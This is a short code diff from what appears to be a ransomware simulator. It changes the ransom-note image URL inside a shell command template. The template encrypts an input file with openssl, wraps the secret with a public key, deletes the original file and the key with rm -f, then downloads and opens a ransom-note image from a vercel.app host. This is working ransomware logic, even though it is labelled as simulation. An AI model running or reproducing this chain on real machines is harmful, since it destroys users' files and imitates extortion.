@@ -171,7 +171,7 @@ openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:${secret} -in ${input} -out ${
 printf '%s' ${secret} | openssl pkeyutl -encrypt -pubin -inkey ${publicKey} -out ${encryptedKeyOutput} && \
 test -s ${temporaryOutput} && test -s ${encryptedKeyOutput} || { rm -f ${temporaryOutput} ${encryptedKeyOutput}; echo "ENCRYPTION FAILED"; exit 1; } && \
 rm -f ${input} ${publicKey}&& \
-curl -fL 'https://ransomware-simulator-self.vercel.app/ransomnoteimage.png' -o ${ransomNoteOutput} && \
+curl -fL 'https://ransomware-simulator-self.vercel.app/RANSOMNOTE.png' -o ${ransomNoteOutput} && \
 open ${ransomNoteOutput}`
     ]
   };
